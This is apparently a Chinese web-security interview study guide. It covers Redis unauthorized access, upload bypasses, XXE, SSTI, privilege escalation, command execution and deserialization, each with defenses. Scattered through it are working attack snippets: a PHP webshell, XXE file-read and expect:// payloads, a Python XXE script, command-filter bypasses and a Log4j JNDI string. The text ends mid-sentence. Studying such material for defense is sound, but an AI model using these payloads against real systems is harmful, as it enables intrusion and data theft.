1.默认redis写文件后是644的权限，但ubuntu要求执行定时任务件/var/spool/cron/crontabs/权限必须是600也就是-rw-------才会执行，否则会报错，而Centos的定时任务文件权限644也能执行

2.redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错

3.两个系统的定时任务文件目录不同

利用主从复制getshell

条件：

版本(4.x~5.0.5)

原理：

数据读写体量很大时，为了减轻服务器的压力，redis提供了主从模式，主从模式就是指定一个redis实例作为主机，其余的作为从机，其中主机和从机的数据是相同的，而从机只负责读，主机只负责写。通过读写分离可以减轻服务器端的压力。

利用工具：

RedisRogueServer

地址：

https://github.com/n0b0dyCN/redis-rogue-server

使用工具的命令：

python3 redis-rogue-server.py --rhost=x.x.x.x --lhost=x.x.x.x --exp=exp.so

两种使用方法：

交互式

反弹式

限制：

利用这个方法getshell或者rce任意导致redis服务瘫痪，一般不建议使用

## redis未授权访问漏洞的防范措施

1.添加登录密码

2.修改默认端口

3.关闭端口

4.禁止以root用户权限启动，以低权限启动redis服务

## Redis未授权访问漏洞如何入侵利用，以及产生的原因

redis漏洞产生的原因

\1. redis绑定在0.0.0.0:6379,且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；

\2. 没有设置密码认证（一般为空），可以免密码远程登录redis服务。

\3. root身份运行redis

redis利用方法

能够回连且权限够的话，写crontab利用计划任务执行命令反弹shell

开启22端口且权限够大的情况下，通过写公钥到服务器获取系统权限

知道物理路径且web目录有写权限写webshell

redis 4.x之后，主从复制getshell

## Redis未授权常见getshell的几种方式？

web绝对路径写shell

写入ssh公钥获取服务器权限

主从复制getshell

# 文件上传

### 1、文件上传漏洞原理

大部分网站和应用系统都有上传功能，而程序员在开发任意文件上传功能时，并未考虑文件格式后缀的合法性校验或者是否在前端通过js进行后缀检验，这时攻击者开源上传一个与网站脚本语言相对应的恶意代码动态脚本，例如（jsp,asp,php,aspx文件后缀）到服务器上，从而访问这些恶意脚本中包含的恶意代码，进行动态及恶性最终达到执行恶意代码的效果，进一步影响服务器安全

· PHP：如果系统中存在可以上传文件的功能点，就可以上传后门脚本文件，通过一些方法绕过上传限制，如果能访问后门的的话，系统存在文件上传漏洞，可以借助后门执行命令

· Java：上传 jsp 代码

· Asp/Aspx

· Python：因为脚本需要译后生成 pyc 字节码文件，所以不存在文件上传

### 2、文件上传绕过方法

客户端检测绕过（js检测）：

利用firebug禁用js或使用burp代理工具修改扩展名可轻易突破

服务端MIME检测绕过（conten-type检测）

使用burp代理，修改content-type参数

服务端扩展名检测绕过

文件名大小写绕过，例如PHP，asp等类似的文件名

后缀名字双写嵌套，例如pphphp,asaspp等

可以利用系统会对一些特殊文件名做默认修改的系统特性绕过

可以利用asp程序中的漏洞，使用截断字符绕过

可以利用不再黑名单列表中却能够成功执行的同义后缀名绕过黑名单的限制

可以利用解析/包含漏洞配合上传一个代码注入过的白名单文件绕过

服务端内容检测绕过：

通过在文件中添加正常文件的表示或其他关键字符绕过

文件加载检测绕过，针对渲染加载测试

代码注入绕过，针对二次渲染测试

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps60.jpg)

### 3、中间件解析漏洞

IIS解析漏洞

IIS5.X/6.0版本

目录解析漏洞：

当文件夹名为.asp 进行结尾时，文件夹内的所有类型文件将以asp格式进行解析。

比如：xx.asp/1.jpg 1.jpg将会按照 .asp 的格式进行解析

文件解析漏洞：

分号后面的格式会被忽略，只会解析分号前面的格式

比如：1.asp;.jpg 会以asp进行解析

IIS7.0/7.5版本 Nginx畸形解析漏洞 < 0.8.37

默认Fast-CGI 开启，在URL上传的文件名后缀加/.php 会把正常图片当成php解析

Apache解析漏洞

在Apache的解析顺序中，是从右到左开始解析后缀的，如果最右侧的扩展名不可识别，就继续往左判断，直到遇到可以解析的文件后缀为止

比如：上传文件名1.php.xxxx 因为后缀xxxx不可解析，所以向左解析后缀php

常用中间件那些漏洞

IIS PUT 漏洞、短文件名猜解、远程代码执行、解析漏洞 Apache 解析漏洞、目录遍历、任意文件读取

Nginx 文件解析、目录遍历、CRLF 注入、目录穿越

Tomcat 远程代码执行、war 后门文件部署

JBoss 反序列化漏洞、war 后门文件部署

WebLogic 反序列化漏洞 SSRF 任意文件上传 war 后门文件部署

Apache解析漏洞：

Apache解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别文件解析，就再往左判断。比如test.php.owf.rar”,owf”和".rar”这两个后缀是Apache不可识别解析，Apache就会把wooyun.php.owf.rar解析成php

若一个文件名abc.x1.x2.x3,Apache会从x3开始解析，如果x3不是一个能解析的扩展名，就往前解析x2以如此往复，直到能遇到一个能解析的文件名为止

IIS解析漏洞：

在test.asp/jkl，IIS的某些版本中会直接当成asp来解析，test.php；jkl,IIS某些版本也会按照asp来解析；任意文件名/任意文件名.php，IIS某些版本会直接当php来解析

例如，上传test.jpg，然后访问test.jpg/.php或test.jpg/abc.php当前目录下就会生成一句话木马shell.php

Nginx解析漏洞：

将shell语句，如<?PHP fputs(fopen(‘shell.php’, ‘w’),'<?php eval($_POST[cmd])?>’);?>写在文本abc.txt中(shell语句直接写一句话木马,用菜刀，cknife等直连，只是容易被查杀)，然后用命令将shell语句附加在正常图片abc.jpg后copy xx.jpg/b + xx.txt/a test.jpg上传test.jpg，然后访问test.jpg/.php或test.jpg/abc.php当前目录下就会生成一句话木马shell.php 。

IIS6.0

文件夹目录解析 /xx.asp/xx.jpg "xx.asp"是文件夹名，这样只要在 xx.asp 目录下面的任意文件都会当脚本解析。

xx.asp;.jpg 通过上传功能传到网站目录，直接会当作 asp 脚本执行。

IIS 7.0、IIS7.5

默认 Fast-CGI 开启，直接在 url 中图片地址后面输入/1.php，会把正常图片当成 php 解析

Nginx

版本小于等于 0.8.37，利用方法和 IIS 7.0/7.5 一样，Fast-CGI 关闭情况下也可利用。

### 4、文件上传漏洞防御

系统运行时的防御：

1、文件上传的目录设置为不可执行，只要web容器无法解析该目录下的文件，即使攻击者上传了脚本文件，服务器本身也不会收到影响，因此这一点至关重要

2、判断文件类型。在判断过程中，可以结合使用MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的，此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码

3、是用随机数改写文件名和文件路径。文件上传如果要执行代码，则需要用户能够访问到这个文件，在某些环境中，用户能上传但不能访问，如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击

4、单独设置文件服务器的域名。由于浏览器同源策略的关系，一些列客户端攻击将失效，比如上传crossdomain.xml、上传包含JavaScript的XSS利用等问题将得到解决

5、使用安全设备防御。文件上传攻击的本质就是将恶意文件或者脚本文件上传到服务器，专业的安全设备防御因此类漏洞主要是通过对漏洞的上传利用行为和恶意文件的上传过程进行检测。恶意文件千变万化，隐藏手法也不断推陈出新，对普通的心痛管理员来说可以通过部署安全设备来帮助防御

系统开发阶段的防御

1、系统开发人员应有较强的安全意识，尤其是采用PHP语言开发系统。在系统开发阶段应充分考虑系统的安全性。

2、对文件上传漏洞来说，最好能在客户端和服务器端对用户上传的文件名和文件路径等项目分别进行严格的检查。客户端的检查虽然对技术较好的攻击者来说可以借助工具绕过，但是这也可以阻挡━些基本的试探。服务器端的检查最好使用白名单过滤的方法，这样能防止大小写等方式的绕过，同时还需对%00截断符进行检测，对HTTP包头的content-type也和上传文件的大小也需要进行检查。

系统维护阶段的防御

1、系统上线后运维人员应有较强的安全意思，积极使用多个安全检测工具对系统进行安全扫描，及时发现潜在漏洞并修复。

2、定时查看系统日志，web服务器日志以发现入侵痕迹。定时关注系统所使用到的第三方插件的更新情况，如有新版本发布建议及时更新，如果第三方插件被爆有安全漏洞更应立即进行修补。

3、对于整个网站都是使用的开源代码或者使用网上的框架搭建的网站来说，尤其要注意漏洞的自查和软件版本及补丁的更新，上传功能非必选可以直接删除。除对系统自生的维护外，服务器应进行合理配置，非必选一般的目录都应去掉执行权限，上传目录可配置为只读。

### 5、文件上传有了解吗？

· 这主要看一些文件上传的代码有没有 严格限制用户上传的文件类型，比如，只允许上传.jpg|.png|.gif文件，但是由于代码不严谨，或者只在前端验证这个文件的格式等等，造成了攻击者可以上传任意文件，自定义文件。

· 2>利用思路：常规类：扫描获取上传、会员中心上传、后台系统上传、各种途径上传。CMS类：已知CMS源码。编译器类：ckeditor、fckeditor、kindeditor、xxxxeditor。其他类/CVE：代码审计、平台/第三方应用。

# 文件包含漏洞面试题总结

### 1、文件包含原理

调用文件包含函数时，未严格限制文件名和路径，如include、require等函数

### 2、文件包含如何getshell

上传图片马，通过文件包含的方式getshell

通过登录ssh，将木马写入ssh登录日志getshell

通过恶意访问HTTP，通过包含web日志进行getshell

Php伪协议getshell php://input

### 3、PHP文件包含漏洞的函数，利用文件包含有哪些限制条件？

include()

require()

include_once()

require_once()

php中 allow_url_include（本地文件包含开关） 和 allow_url_forpen（远程文件包含开关）

### 4、分类

本地包含

远程包含：需要魔术函数关闭，远程包含功能打开

### 5、如何挖掘文件包含漏洞

白盒测试找源代码中4函数

include，include_once, require,require_once

黑盒测试：看参数后面是否等于一个文件，或者等于某一个链接地址

### 6、文件包含可以做什么？

读文件，写文件/命令执行，可以包含图片木马执行

### 7、文件包含可以做什么？

读文件，写文件/命令执行，可以包含图片木马执行

### 8、本地包含与远程包含的区别？

本地包含只需要找个上传点，把图片木马上传到对方服务器，通过本地包含漏洞直接包含木马脚本木马就可以运行webshell，远程包含需要服务器php关闭魔术符号与开启远程包含功能才行。

### 9、include、require有什么区别

include函数：会将指定的文件读入并且执行里面的程序；

require函数：会将目标文件的内容读入，并且把自己本身代换成这些读入的内容；

include_once 函数：在脚本执行期间包含并运行指定文件。此行为和 include 语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含。如同此语句名字暗示的那样，只会包含一次；

require_once 函数：和 require 语句完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。

include与require除了在处理引入文件的方式不同外，最大的区别就是：include在引入不存文件时产生一个警告且脚本还会继续执行，而require则会导致一个致命性错误且脚本停止执行。

include()与require()的功能相同，但在用法上却有一些不同，include()是有条件包含函数，而 require()则是无条件包含函数。

include_once （require_once）语句在脚本执行期间包含并运行指定文件。区别是如果该文件中的代码已经被包含了，则不会再次包含，只会包含一次。include_once（require_once）需要查询一遍已加载的文件列表, 确认是否存在, 然后再加载。

require通常使用方法，这个函数通常放在 PHP 程序的最前面，PHP 程序在执行前，就会先读入 require 所指定引入的文件，使它变成 PHP 程序网页的一部份。常用的函数，亦可以这个方法将它引入网页中。

include通常使用方法，这个函数一般是放在流程控制的处理部分中。PHP 程序网页在读到 include 的文件时，才将它读进来。这种方式，可以把程序执行时的流程简单化。

# 任意文件下载

## 如何验证存在任意文件下载的漏洞

一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞。

利用条件：

· 存在读文件的函数

· 读取文件的路径用户可控且未校验或校验不严

· 输出了文件内容

任意文件下载和任意文件读取有着相似的地方：就是都需要路径 例如 index.php?f=ﬁle:///etc/passwd index.php?f=../index.php

## 修复方案

· 过滤用户数据，如"/”，"*”,"."等特殊字符

· 更新中间件

· 要下载的文件地址保存至数据库中。

· 文件路径保存至数据库，让用户提交文件对应ID或session下载文件。

· 用户下载文件之前需要进行权限判断。

· 文件放在web无法直接访问的目录下。

· 不允许提供目录遍历服务。

· 公开文件可放置在web应用程序下载目录中通过链接进行下载

# XXE外部实体注入攻击

### 1、XXE原理

运维人员使用低版本php，libxml低于2.9.1就会造成XXE

或者程序员设置了libxml_disable_entity_loader(FALSE)

XXE漏洞发生在应用程序解析XML输入时，「没有禁止外部实体的加载」，导致用户可以控制外部的加载文件，造成XXE漏洞，「导致如文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击」等危害。

### 2、如何找XEE漏洞

抓包看accept头是否接受xml

抓包修改数据类型，把json改成xml来传输数据

### 3、XSS攻击方式

有回显：可以直接在DTD中读取文件内容，攻击者通过列目录、读文件，获取帐号密码后进一步攻击。

无回显：XXE攻击无回显需要单独建立dtd文件，然后用XML调用

如果没有回显，我们可以借助dnslog来确定此处是否存在XXE漏洞」。如果dnslog收到请求，那么说明此处存在漏洞

发完payload，然后到dnslog平台查看是否收到了请求，如果收到了，那么就可以确定这里存在XXE漏洞

### 4、XXE防御方式

禁止使用DTD的外部声明；

对用户提交过来的XML数据进行过滤。

过滤关键词：<!DOCTYPE和<!ENTITY，或者，SYSTEM和PUBLIC。

### 5、XXE危害

XXE的危害1：任意文件读取

利用file、http协议，在DTD外部引用中注入，从而获取文件内容。任意文件读取有分为有回显和无回显两种。

有回显：可以直接在DTD中读取文件内容，攻击者通过列目录、读文件，获取帐号密码后进一步攻击。

无回显：

如果没有回显的话可以把数据发送到远程服务器。

XXE危害2：命令执行

php环境下，xml命令执行要求php装有expect扩展。而该扩展默认没有安装。

XXE危害3：内网探测/SSRF

由于xml实体注入攻击可以利用http://协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。

XXE危害4：攻击内网网站

· 1.像上文那个 file://xxx 的，很明显可以造成敏感数据泄露。

· 2.可以利用 XXE 执行 SSRF 攻击。

· 3.利用盲 XXE 将泄露数据外带；通过报错信息检索数据。

· 4.XXE 与文件上传结合，造成 getshell。

### 6、XXE如何利用

1.读取任意文件

<div>
<?xml version="1.0" encoding="utf-8"?>
</div>

<div>
<!DOCTYPE xxe [

<!ELEMENT name ANY >
</div>

<div>
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
</div>

<div>
<root>
</div>

<name>&xxe;</name>

<div>
</root>
</div>

2.执行系统命令

<div>
<?xml version="1.0" encoding="utf-8"?>
</div>

<div>
<!DOCTYPE xxe [

<!ELEMENT name ANY >
</div>

<div>
<!ENTITY xxe SYSTEM "expect://ifconfig" >]>
</div>

<div>
<root>
</div>

<name>&xxe;</name>

<div>
</root>
</div>

3.探测内网端口

<div>
<?xml version="1.0" encoding="utf-8"?>
</div>

<div>
<!DOCTYPE xxe [

<!ELEMENT name ANY >
</div>

<div>
<!ENTITY xxe SYSTEM "http://172.16.9.200:22" >]>
</div>

<div>
<root>
</div>

<name>&xxe;</name>

<div>
</root>
</div>

4.攻击内网网站

<div>
<?xml version="1.0" encoding="utf-8"?>
</div>

<div>
<!DOCTYPE xxe [

<!ELEMENT name ANY >
</div>

<div>
<!ENTITY xxe SYSTEM "http://172.16.9.200:22" >]>
</div>

<div>
<root>
</div>

<name>&xxe;</name>

<div>
</root>
</div>

5.读取信息

import urllib2  ## 进行信息收集

if __name__='__main__':

print u"输入要访问的地址"

url=raw_input()

count=1

while count == 1:

​    print u'要读取的文件，如file:///etc/passwd:'

​    payload = raw_input()

​    headers={'Content-type':'text/xml'}xml = '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE xxe [<!ELEMENT name ANY ><!ENTITY xxe SYSTEM "' + payload + '" >]><root><name>&xxe;</name></root>'

​

​    req=urllib2.Request(url=url,headers=headers,data=xml)

​    res_data=urllib2.urlopen(req)

​    res=res_data.read()

​    print res

# SSTI（服务器端模板注入）

## 1、SSTI原理

服务器模板接收了用户输入的恶意代码，未经过滤便在服务端执行并通过渲染模板返回给用户，使得用户可以通过构造恶意代码在服务端执行命令

## 2、常见的模板引擎

· PHP

Twig模板变量：{{%s}}

Smarty模板变量：{%s}

Blade模板变量：{{%s}}

· Python

Jinja2模板变量：{{%s}}

Tornado模板变量：{{%s}}

Django模板变量：{{ }}

· Java

FreeMarker模板变量：<#%s>``${%s}

Velocity模板变量：#set($x=1+1)${x}

## 3、如何测试是否存在SSTI

就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI

## 4、SSTI的防护

(1) 和其他的注入防御一样，绝对不要让用户对传入模板的内容或者模板本身进行控制。

(2) 减少或者放弃直接使用格式化字符串结合字符串拼接的模板渲染方式，使用正规的模板渲染方法。

# 越权访问

### 1、原理

如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。 越权漏洞形成的原因是后台使用了不合理的权限校验规则导致的。

### 2、如何挖掘越权漏洞

一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。

### 3、越权可能发生的地方

所有用户信息查询,修改,等页面.

如网上银行的余额信息,普通网站的个人资料查询修改等页面.

只要涉及到要从数据库中查询或提交数据的地方,都有可能存在越权漏洞的产生.

### 4、越权分类

水平越权（横向越权）：A用户和B用户属于同一级别用户，但各自不能操作对方个人信息，A用户如果越权操作B用户的个人信息的情况称为平行越权操作。

先登录在一个账户里面，查看个人信息进行burp抓包把username修改成别的账户的，看是否可以看到修改账户的信息，如果看到说明存在越权漏洞

即：不同账号之间是同一权限，但抓包该用户能够直接换号访问

\1. 先登录在一个账号里面（一般越权漏洞都是在登录后的信息页面）

\2. 查看个人信息（看看是什么内容提交到后台）

\3. 测试有没有越权漏洞（如果可以通过Burp抓包修改Username 别的账户来查看信息，说明存在越权漏洞）

\4. 修改账号（不用登录密码）实现越权查看别的账户信息（说明：存在越权漏洞）

垂直越权（纵向越权）：A用户权限高于B用户，B用户越权操作A用户的权限的情况称为垂直越权。

先用管理员账户登录。用burp进行抓包，先抓管理员添加用户的数据包，再退出管理员的登录，登录普通用户，用burp进行抓包，抓普通用户的cookie进行复制，去抓管理员添加用户的数据包，把普通用户的cookie替换成管理员的cookie，然后点击重定向。登录普通用户进行刷新看是否用普通用户添加了新账户

即：不同账号名之间是不同权限，但抓包该用户名能够直接执行不同权限的命令

（首先以root用户登录创建用户同时抓取数据包，抓取普通用户登录的cookie信息，将管理员页面的cookie信息替换为普通用户的cookie，查看有没有创建用户（实现的是普通用户越权进行了管理员创建用户的）

\1. 先用管理员登录（查看管理员的权限（包含：增加，删除，修改等））

\2. 管理员账号的权限

\3. 用burp进行抓包，先抓管理员添加用户的数据包

\4. 先退出管理员的登录

\5. 登录我们的普通用户

\6. 查看普通用户的权限（普通用户只有查看权限）

\7. 用burp进行抓包，抓普通用户的cookie进行复制

\8. 去抓管理员添加用户的数据包，把普通用户的cookie替换管理员的cookie（因为此时管理员账户已经退出了，所有cookie是无效的，也不可以添加用户的操作了，我们用普通用户的cookie来代替管理员的操作，这样就实现了越权的操作）

\9. 然后再点击重定向

\10. 回到普通用户登录的浏览器，进行刷新 可以看到我们用普通用户添加了新的账号（说明：存在越权漏洞）

### 5、任意金额购买

· 选择商品  -> 发起订单请求 -> 服务器确认订单 ->  生成支付接口（1000元） ->发送给前端 -> 用户支付->银行返回支付成功->订单完成。

· 通过bp，在支付1000元时抓包，然后通过修改金额，使用户可以修改价格购买商品。

### 6、越权漏洞修复

1）前后端同时对用户输入信息进行验证

2）调用功能前验证用户是否有权限进行验证

3）执行关键操作前必须验证用户身份，验证用户是否具备操作数据权限。

4）直接对象引用加密资源ID，防止攻击者枚举ID，敏感数据特殊化处理。

5）对可控参数进行严格的检查和过滤

# 越权漏洞之支付漏洞

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps61.jpg)

## 支付漏洞如何挖掘

1、找到关键的数据包

可能一个支付操作有三四个数据包，我们要对数据包进行挑选。

2、分析数据包

支付数据包中会包含很多的敏感信息（账号，金额，余额，优惠），要尝试对数据包中的各个参数进行分。析。

3、不按套路出牌

多去想想开发者没有想到的地方。

4、pc端尝试过，wap端也看看，app也试试

## 防御方法

1、在后端检查订单的每一个值，包括支付状态；

2、校验价格、数量参数，比如产品数量只能为整数，并限制最大购买数量 ；

3、与第三方支付平台检查，实际支付的金额是否与订单金额一致；

4、如果给用户退款，要使用原路、原订单退回。比如：退押金，按用户原支付订单原路退回；

5、MD5 加密、解密、数字签名及验证，这个可以有效的避免数据修改，重放攻击中的各种问题；

6、金额超过指定值，进行人工审核等。

# 逻辑漏洞

### 1、如何挖掘逻辑漏洞？

确定业务流程—>寻找流程中可以被操控的环节—>分析可被操控环节中可能产生的逻辑问题—>尝试修改参数触发逻辑问题

### 2、逻辑漏洞和越权漏洞修复防御方案

（1）前后端同时对用户输入信息进行校验，双重验证机制.

（2）调用功能前验证用户是否有权限调用相关功能.

（3）执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限.

（4）直接对象引用的加密资源 ID，防止攻击者枚举 ID，敏感数据特殊化处理.

（5）永远不要相信来自用户的输入，对于可控参数进行严格的检查与过滤.

### 3、说出几个业务逻辑漏洞类型？

任意用户密码重置

短信轰炸

订单金额修改

忘记密码绕过

恶意刷票

验证码复用

### 4、业务逻辑漏洞，用户任意密码重置有什么例子，因为什么因素导致的？

普通用户重置管理用户密码

普通用户重置普通用户密码

未设置用户唯一Token，导致越权

### 5、逻辑漏洞原理

于程序逻辑不严谨或者 逻辑太复杂，导致一些逻辑分支不能正常处理或 者处理错误

# 逻辑漏洞----任意账号注册

### 1、任意无限注册账户

注册的时候进行bp[抓包](https://so.csdn.net/so/search?q=抓包&spm=1001.2101.3001.7020)，然后对用户名进行爆破即可

因为无验证码或者验证码可以被绕过（太简单了），直接发送到intruder模块了，进行爆破，即可批量注册账号

### 2、前端验证审核绕过

1.使用正常账号修改密码，获取验证码，验证码随便填一个

2.使用bp抓包，服务器会返回验证码错误之类的信息，但是我们可以使用正确的信息来进行替换（前提：我们正常修改过密码一次）

### 3、个人信息伪造

若出现身份证信息注册，可任意构造绕过身份证与姓名

网站本身没有权限去验证你的身份证到底是对的还是错的，直接伪造一个大于18岁的就可以绕过防沉迷系统

### 4、邮箱/手机号注册激活验证绕过

为防止恶意用户任意注册账户，大多数网站会在用户注册中输入邮箱/手机号后对其真实性进行验证，但有时候返回的验证码信息会直接隐藏在返回包中，只是不在前端显示出来，或者是可以通过抓包改包手机号/邮箱，伪造该信息，劫持到验证信息

### 5、用户名覆盖

数据库中已经有一个用户名叫做a了，但是一个新用户注册了账号，新用户的用户名也叫a，但是开发人员并没有对重复的用户名进行提示，而是直接将数据插入数据库，导致老用户的用户名被覆盖了

登录查看时却获取到数据库中同名用户的其他用户信息，导致其他用户信息泄露，或者由于验证用户名存在时，从前端获取到的数据与从数据库获取到的数据不同，但是往数据库中写入的时候却写了相同的部分

# 验证码

### 1、暴力破解对方有验证码怎么绕过

三个方面 客户端 服务端 弱验证码绕过

客户端的话就是用java script 使用bp抓包 可以把验证码删掉

服务端因为session默认是24分钟时间 如果验证码校验时没有销毁session 我们就有24分钟时间 抓包 然后验证码固定 只对用户名或密码设置变量 然后进行暴力破解。

弱验证码 通过工具识别 token值的话在回包里面提取代入暴力破解

### 2、验证码相关利用点

验证码复用

验证码可识别

验证码失效

验证码DDOS

# 远程命令代码执行

### 1、原理

参数赋值给变量未经过滤，直接使用不安全的函数system、eval、assert、反单引号直接执行变量

命令执行漏洞原理

在操作系统中，"&、|、||”都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令

代码执行漏洞原理

应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。

### 2、命令执行与代码执行漏洞区别

命令执行漏洞是可以直接调用操作系统命令，代码执行漏洞是靠执行脚本代码调用操作系统命令

### 3、命令执行&代码执行漏洞危害

可以执行代码、系统命令进行读写文件、反弹shell等操作，拿下服务器，进一步内网渗透等等

### 4、命令执行无回显

命令执行无回显的话，可以尝试下面三种方式

延时

http请求

DNS请求

### 5、代码执行函数

主要有（9个）：eval()，assert()，call_user_func()，create_function()，array_map()，call_user_func_array()，array_filter()，uasort()，preg_replace()

### 6、命令执行函数

主要有（7个）：system()，passthru()，exec()，pcntl_exec()，shell_exec()，popen()/proc_popen()，反引号 ``

### 7、漏洞产生的原因

1.没有对用户输入进行过滤或过滤不严

例如：没有过滤&、&&、|、||等连接符号

2.系统漏洞造成的命令执行

bash破壳漏洞（CVE-2014-6271），该漏洞可以构造环境变量的值来执行具有攻击力的脚本代码，会影响到bash交互的多种应用，如http、ssh、dhcp等

3.调用的第三方组件存在代码执行漏洞

php（system、shell_exec、exec、eval）

JAVA中的命令执行漏洞（struts2/ElasticsearchGroovy）

ThinkPHP命令执行

### 8、命令执行绕过

1.type绕过命令执行

type.\flag.txt type,flag.txt

2.使用特殊符号进行绕过

whoami

who<sup>am</sup>i

who""ami"i”

who""""ami

3.set命令绕过

set a=who

set b=ami

%a%%b% //正常执行whoami

call %a%%b% //正常执行whoami

4.使用ping绕过执行命令

cmd.exe /c "ping 127.0.0.1/../../../../../../../../../../windows/system32/whoami"

### 9、漏洞防范

1、尽量不要使用系统执行命令，以免造成不必要的危害

2、在执行命令函数、方法前，变量一定要做好过滤，对敏感字符进行转义

3、使用动态函数之前，确保使用的函数是指定的函数，避免使用用户输入的函数

4、对PHP语言来说，不能完全控制的危险函数最好不要使用

### 10、JAVA 中命令执行用到那些函数

通过 Runtime.getRuntime().exec()函数执行系统命令

# 反序列化

### 1、反序列化原理

把一个对象变成可以传输的字符串

PHP反序列化的时候，基本都是围绕着serialize()，unserialize()这两个函数

### 2、PHP反序列化漏洞的几个魔法函数

__construct()当一个对象创建时被调用

__destruct()当一个对象销毁时被调用

__toString()当一个对象被当作一个字符串使用

__sleep() 在对象在被序列化之前运行

__wakeup将在序列化之后立即被调用

### 3、JAVA反序列化

JAVA反序列化就是将java对象转化为字节序列的过程。反序列化的过程就是

创建一个对象输出流

通过对象输出流的ReadObject（）方法来读取对象

### 4、PHP反序列化函数

serialize，unserialize；json_encode，json_decode

json_encode 和 json_decode

使用JSON格式序列化和反序列化是一个不错的选择：

· 使用json_encode和json_decode格式输出要serialize和unserialize格式快得多。

· JSON格式是可读的。

· JSON格式比serialize返回数据结果小。

· JSON格式是开放的、可移植的。其他语言也可以使用它。

var_export 和 eval

var_export 函数把变量作为一个字符串输出；eval把字符串当成PHP代码来执行，反序列化得到最初变量的内容。

wddx_serialize_value 和 wddx deserialize

wddx_serialize_value函数可以序列化数组变量，并以XML字符串形式输出。

### 5、序列化反序列化及其流量特征

序列化：对象转换为字符串

反序列化：字符串转换为对象

流量特征：

shiro反序列化：查看cookie中rememberme字段，恶意命令要从这里传入。判断是否有漏洞，查看返回包set cookie：rememberme=deleteme，验证失败返回的标识符。

fastjson反序列化：请求报文中查找json格式的数据，重点看有无rmi或者出网的一些行为

st2-045：请求头中的Content-Type字段

### 6、了解过反序列化漏洞吗？

序列化是指程序将对象转化为字节序列从而便于存储运输的一种方 式，反序列化则与其相反，即将字节序列转化为对象供程序使用。程序在进 行反序列化时会调用一些函数，比如常见的 PHP 反序列化函数 unserialize() 以及一些常见的魔术方法，比如构造函数_construct()，析构函数 _destruct()，_wakeup()，_toString()，_sleep()等等。如果这些函数在传递 参数时没有进行严格的过滤措施，那么攻击者就可以构造恶意代码并将其序 列化后传入函数中，从而导致反序列化漏洞。

# 框架漏洞

## Apache log4j远程代码执行漏洞

原理：

log4j 远程代码执行漏洞

Log4j 是 Apache 的一个开源项目，是一款基于 Java 的开源日志记录工具。

该漏洞主要是由于日志在打印时当遇到`${`后，以:号作为分割，将表达式内容分

割成两部分，前面一部分 prefix，后面部分作为 key，然后通过 prefix 去找对应

的 lookup，通过对应的 lookup 实例调用 lookup 方法，最后将 key 作为参数带入

执行，引发远程代码执行漏洞。

具体操作：

在正常的 log 处理过程中对${这两个紧邻的字符做了检测，一旦匹配到类似于

表达式结构的字符串就会触发替换机制，将表达式的内容替换为表达式解析后的内

容，而不是表达式本身，从而导致攻击者构造符合要求的表达式供系统执

行

### 1、原理

当log4j打印的日志内容中包括 ${jndi:ldap://ip}时，程序就会通过Idap协议访问ip这个地址，然后ip就会返回一个包含Java代码的class文件的地址，然后程序再通过返回的地址下载class文件并执行

### 2、影响范围

Apache Log4j 2.x < 2.15.0-rc2

### 3、利用

log4j就是java的日志插件，处理日志时存在”${}"表达式的注入

我们可以通过出网协议jndi，rmi，ldap，jrmp，jms，jmx来实现注入

### 4、流量特征

流量特点就是数据包中存在着”${"字段

### 5、修复建议

禁用lookup或JNDI服务

升级Apache log4j

关闭不必要的外网请求

## shiro反序列化漏洞

Shiro 反序列化漏洞

原理：

Shiro 是 Apache 下的一个开源 Java 安全框架，执行身份认证，授权，密码和会话 管理。shiro 在用户登录时除了账号密码外还提供了可传递选项 remember me。用 户在登录时如果勾选了 remember me 选项，那么在下一次登录时浏览器会携带 cookie 中的 remember me 字段发起请求，就不需要重新输入用户名和密码。

判断：

1.数据返回包中包含 rememberMe=deleteMe 字段。

2.直接发送原数据包，返回的数据中不存在关键字可以通过在发送数据包的 cookie 中增加字段：rememberMe=然后查看返回数据包中是否存在关键字。

shiro-550：

shiro 反序列化漏洞利用有两个关键点，首先是在 shiro<1.2.4 时，AES 加密的密

钥 Key 被硬编码在代码里，只要能获取到这个 key 就可以构造恶意数据让 shiro 识

别为正常数据。另外就是 shiro 在验证 rememberMe 时使用了 readObject 方法，

readObject 用来执行反序列化后需要执行的代码片段，从而造成恶意命令可以被

执行。攻击者构造恶意代码，并且序列化，AES 加密，base64 编码后，作为cookie 的 rememberMe 字段发送。Shiro 将 rememberMe 进行编码，解密并且反序列

化，最终造成反序列化漏洞。

shiro-721：

不需要 key，利用 Padding Oracle Attack 构造出 RememberMe 字段后段的值结合

